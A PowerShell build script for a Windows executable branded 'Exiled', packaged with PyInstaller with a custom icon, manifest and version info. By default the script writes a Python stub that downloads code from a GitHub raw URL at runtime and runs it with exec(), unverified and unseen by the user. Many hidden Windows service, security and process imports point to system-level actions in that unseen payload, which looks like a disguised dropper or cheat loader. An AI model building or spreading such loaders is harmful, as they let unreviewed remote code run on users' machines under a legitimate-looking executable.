[CmdletBinding()]
param(
    [string]$Out = "Exiled",
    [string]$Url = "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/external.py",
    [string]$Icon = "https://cdn.discordapp.com/icons/1517380157533589564/e792598236304c90d8f46d24512af29f.webp?size=1024",
    [switch]$Local,
    [switch]$NoIcon,
    [switch]$KeepBuild,
    [switch]$NoDeps
)

$ErrorActionPreference = "Stop"
$ProgressPreference    = "SilentlyContinue"

$AppName    = "Exiled"
$AppVersion = "1.0.0.0"
$Company    = "Exiled"
$OutName    = $Out
$WorkDir    = Join-Path $PWD "_build"
$DistDir    = Join-Path $PWD "dist"
$StubPy     = Join-Path $WorkDir "payload.py"
$IconRaw    = Join-Path $WorkDir "icon.raw"
$IconIco    = Join-Path $WorkDir "icon.ico"
$ExePath    = Join-Path $DistDir "$OutName.exe"
$Manifest   = Join-Path $WorkDir "$OutName.manifest"
$VersionTxt = Join-Path $WorkDir "version.txt"

function Log  { param([string]$M, [string]$C = "Cyan"); Write-Host "[$AppName] $M" -ForegroundColor $C }
function Fail { param([string]$M); Write-Host "[$AppName] ERROR: $M" -ForegroundColor Red; exit 1 }
function Get-Arch { if ([Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" } }

function Test-Python {
    param([string]$Exe)
    if (-not $Exe -or -not (Test-Path -LiteralPath $Exe)) { return $false }
    & $Exe -c "import sys" 2>$null
    return ($LASTEXITCODE -eq 0)
}

function Find-Python {
    $c = @()
    foreach ($n in @("python","py","python3")) {
        $cmd = Get-Command $n -ErrorAction SilentlyContinue
        if ($cmd -and $cmd.Source) { $c += $cmd.Source }
    }
    foreach ($r in @(
        "$env:LocalAppData\Programs\Python\Python*",
        "$env:ProgramFiles\Python*",
        "${env:ProgramFiles(x86)}\Python*"
    )) {
        Get-ChildItem -Path $r -Filter "python.exe" -ErrorAction SilentlyContinue |
            ForEach-Object { $c += $_.FullName }
    }
    foreach ($x in ($c | Select-Object -Unique)) {
        if (Test-Python -Exe $x) { return $x }
    }
    return $null
}

function Install-Python {
    Log "python not found — installing via winget" "Yellow"
    $wg = Get-Command winget -ErrorAction SilentlyContinue
    if (-not $wg) { return $false }
    & winget install --id Python.Python.3.12 --scope user --silent `
        --accept-package-agreements --accept-source-agreements 2>$null
    return ($LASTEXITCODE -eq 0)
}

function Install-Packages {
    param([string]$Exe, [string[]]$Pkgs)
    Log "installing deps: $($Pkgs -join ', ')"
    & $Exe -m pip install --quiet --disable-pip-version-check --upgrade pip
    & $Exe -m pip install --quiet --disable-pip-version-check @Pkgs
    if ($LASTEXITCODE -ne 0) { Fail "pip install failed" }
}

function Fetch-File {
    param([string]$U, [string]$Dest)
    $curl = Get-Command curl.exe -ErrorAction SilentlyContinue
    if ($curl) {
        & curl.exe -fsSL -A "Mozilla/5.0" $U -o $Dest
    } else {
        Invoke-WebRequest -Uri $U -OutFile $Dest -UseBasicParsing -Headers @{ "User-Agent" = "Mozilla/5.0" }
    }
    if (-not (Test-Path -LiteralPath $Dest)) { Fail "fetch failed: $U" }
}

function Pause-Brief { param([int]$Ms = 90); Start-Sleep -Milliseconds $Ms }

Write-Host ""
Write-Host "  ╔════════════════════════════════════════╗" -ForegroundColor DarkCyan
Write-Host "  ║   $AppName  ·  v$AppVersion  ·  $(Get-Arch)       ║" -ForegroundColor DarkCyan
Write-Host "  ╚════════════════════════════════════════╝" -ForegroundColor DarkCyan
Write-Host ""

Log "python  →  locating..."
$PythonExe = Find-Python
if (-not $PythonExe) {
    Install-Python | Out-Null
    $PythonExe = Find-Python
}
if (-not $PythonExe) { Fail "python not found." }
& $PythonExe -c "import tkinter" 2>$null
if ($LASTEXITCODE -ne 0) { Fail "python missing tkinter." }
Log "python  →  $PythonExe" "Green"
Pause-Brief

if (-not $NoDeps) {
    Install-Packages -Exe $PythonExe -Pkgs @("pyinstaller","pillow","pywin32","psutil","requests")
    Log "deps    →  ready" "Green"
    Pause-Brief
}

New-Item -ItemType Directory -Force -Path $WorkDir | Out-Null
New-Item -ItemType Directory -Force -Path $DistDir | Out-Null

$useIco = $false
if (-not $NoIcon -and $Icon) {
    try {
        if ($Icon -match '^https?://') {
            Log "icon    →  fetching"
            Fetch-File -Url $Icon -Dest $IconRaw
        } else {
            if (-not (Test-Path -LiteralPath $Icon)) { Fail "icon missing: $Icon" }
            Copy-Item -LiteralPath $Icon -Destination $IconRaw -Force
        }
        Log "icon    →  converting to .ico"
        $conv = @"
from PIL import Image
img = Image.open(r'$IconRaw')
if img.mode != 'RGBA': img = img.convert('RGBA')
img.save(r'$IconIco', format='ICO', sizes=[(256,256),(128,128),(64,64),(48,48),(32,32),(16,16)])
"@
        $convPy = Join-Path $WorkDir "_icon.py"
        Set-Content -Path $convPy -Value $conv -Encoding UTF8
        & $PythonExe $convPy
        if ($LASTEXITCODE -eq 0) {
            $useIco = $true
            Log "icon    →  ready" "Green"
        } else {
            Log "icon    →  conversion failed" "Yellow"
        }
    } catch {
        Log "icon    →  $($_.Exception.Message)" "Yellow"
    }
}
Pause-Brief

$bootstrap = @"
import os, sys, ctypes
from ctypes import wintypes

def _exiled_taskbar():
    try:
        ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID(
            "Exiled.External.$AppVersion")
    except Exception:
        pass
    try:
        ico = None
        if getattr(sys, "frozen", False):
            base = getattr(sys, "_MEIPASS", os.path.dirname(sys.executable))
            for c in (os.path.join(base, "icon.ico"),
                      os.path.join(os.path.dirname(sys.executable), "icon.ico")):
                if os.path.exists(c):
                    ico = c; break
        else:
            c = os.path.join(os.path.dirname(os.path.abspath(__file__)), "icon.ico")
            if os.path.exists(c): ico = c
        if not ico: return
        hb = ctypes.windll.user32.LoadImageW(None, ico, 1, 0, 0, 0x10 | 0x8000)
        hs = ctypes.windll.user32.LoadImageW(None, ico, 1, 16, 16, 0x10 | 0x8000)
        WNDPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, wintypes.HWND,
                                     wintypes.UINT, wintypes.WPARAM, wintypes.LPARAM)
        class WC(ctypes.Structure):
            _fields_ = [("cbSize", wintypes.UINT), ("style", wintypes.UINT),
                        ("lpfnWndProc", WNDPROC), ("cbClsExtra", ctypes.c_int),
                        ("cbWndExtra", ctypes.c_int), ("hInstance", wintypes.HINSTANCE),
                        ("hIcon", wintypes.HICON), ("hCursor", wintypes.HANDLE),
                        ("hbrBackground", wintypes.HBRUSH), ("lpszMenuName", wintypes.LPCWSTR),
                        ("lpszClassName", wintypes.LPCWSTR), ("hIconSm", wintypes.HICON)]
        wc = WC()
        wc.cbSize = ctypes.sizeof(WC)
        wc.lpfnWndProc = WNDPROC(lambda h,m,w,l: ctypes.windll.user32.DefWindowProcW(h,m,w,l))
        wc.hInstance = ctypes.windll.kernel32.GetModuleHandleW(None)
        wc.hIcon = hb; wc.hIconSm = hs
        wc.lpszClassName = "ExiledExternalWindow"
        ctypes.windll.user32.RegisterClassExW(ctypes.byref(wc))
    except Exception:
        pass

_exiled_taskbar()
"@

if ($Local) {
    if (-not (Test-Path -LiteralPath $Url)) { Fail "payload missing: $Url" }
    Log "payload →  local"
    $orig = Get-Content -LiteralPath $Url -Raw
    Set-Content -Path $StubPy -Value ($bootstrap + "`n" + $orig) -Encoding UTF8
} else {
    Log "payload →  remote stub"
    $body = $bootstrap + @"

import urllib.request
import tkinter
import tkinter.ttk
import tkinter.messagebox
import tkinter.filedialog
import tkinter.simpledialog
import tkinter.scrolledtext
import tkinter.font
import tkinter.colorchooser

exec(compile(urllib.request.urlopen('$Url').read(), '<url>', 'exec'))
"@
    Set-Content -Path $StubPy -Value $body -Encoding UTF8
}
Log "payload →  written" "Green"
Pause-Brief

Log "manifest  →  generating"
$manifestXml = @"
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <assemblyIdentity version="$AppVersion" processorArchitecture="*" name="$Company.$OutName" type="win32"/>
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
    <application>
      <supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}"/>
      <supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}"/>
      <supportedOS Id="{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}"/>
    </application>
  </compatibility>
  <application xmlns="urn:schemas-microsoft-com:asm.v3">
    <windowsSettings>
      <dpiAware xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">true</dpiAware>
      <dpiAwareness xmlns="http://schemas.microsoft.com/SMI/2016/WindowsSettings">permonitorv2</dpiAwareness>
      <longPathAware xmlns="http://schemas.microsoft.com/SMI/2016/WindowsSettings">true</longPathAware>
    </windowsSettings>
  </application>
</assembly>
"@
Set-Content -Path $Manifest -Value $manifestXml -Encoding UTF8

Log "version    →  generating"
$versionTxt = @"
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=($($AppVersion.Split('.')[0]), $($AppVersion.Split('.')[1]), $($AppVersion.Split('.')[2]), $($AppVersion.Split('.')[3])),
    prodvers=($($AppVersion.Split('.')[0]), $($AppVersion.Split('.')[1]), $($AppVersion.Split('.')[2]), $($AppVersion.Split('.')[3])),
    mask=0x3f, flags=0x0, OS=0x40004, fileType=0x1, subtype=0x0, date=(0, 0)
  ),
  kids=[
    StringFileInfo([StringTable('040904B0',
      [StringStruct('CompanyName', '$Company'),
       StringStruct('FileDescription', '$AppName'),
       StringStruct('FileVersion', '$AppVersion'),
       StringStruct('InternalName', '$OutName'),
       StringStruct('LegalCopyright', 'Copyright $Company'),
       StringStruct('OriginalFilename', '$OutName.exe'),
       StringStruct('ProductName', '$AppName'),
       StringStruct('ProductVersion', '$AppVersion')])]),
    VarFileInfo([VarStruct('Translation', [1033, 1200])])
  ]
)
"@
Set-Content -Path $VersionTxt -Value $versionTxt -Encoding UTF8
Pause-Brief

Log "freeze  →  $OutName.exe"
$pyi = @(
    "-m","PyInstaller",
    "--onefile",
    "--windowed",
    "--noconfirm","--clean",
    "--name", $OutName,
    "--distpath", $DistDir,
    "--workpath", (Join-Path $WorkDir "pyi"),
    "--specpath", $WorkDir,
    "--manifest", $Manifest,
    "--version-file", $VersionTxt,
    "--collect-all","tkinter",
    "--collect-all","PIL",
    "--collect-submodules","win32com",
    "--hidden-import","win32api",
    "--hidden-import","win32con",
    "--hidden-import","win32file",
    "--hidden-import","win32process",
    "--hidden-import","win32security",
    "--hidden-import","win32event",
    "--hidden-import","win32service",
    "--hidden-import","win32serviceutil",
    "--hidden-import","win32timezone",
    "--hidden-import","pythoncom",
    "--hidden-import","pywintypes",
    "--hidden-import","psutil",
    "--hidden-import","requests"
)
if ($useIco) {
    $pyi += @("--icon", $IconIco)
    $pyi += @("--add-data", "$IconIco;.")
}
$pyi += $StubPy

& $PythonExe @pyi
if ($LASTEXITCODE -ne 0) { Fail "pyinstaller failed" }

if ($useIco -and (Test-Path $IconIco)) {
    Copy-Item -LiteralPath $IconIco -Destination (Join-Path $DistDir "icon.ico") -Force
}

if (-not $KeepBuild) {
    Remove-Item -Recurse -Force $WorkDir -ErrorAction SilentlyContinue
}

$ExeItem = Get-Item $ExePath -ErrorAction SilentlyContinue
if ($ExeItem) {
    $sz = [math]::Round($ExeItem.Length / 1MB, 2)
    $ver = $ExeItem.VersionInfo.FileVersion
    Write-Host ""
    Write-Host "  ╔════════════════════════════════════════╗" -ForegroundColor Green
    Write-Host "  ║   done                                    ║" -ForegroundColor Green
    Write-Host "  ╚════════════════════════════════════════╝" -ForegroundColor Green
    Write-Host "  file    : $ExePath" -ForegroundColor DarkGray
    Write-Host "  version : $ver" -ForegroundColor DarkGray
    Write-Host "  size    : $sz MB" -ForegroundColor DarkGray
    if ($useIco) {
        Write-Host "  icon    : $DistDir\icon.ico" -ForegroundColor DarkGray
    }
    Write-Host ""
} else {
    Fail "exe not produced"
}
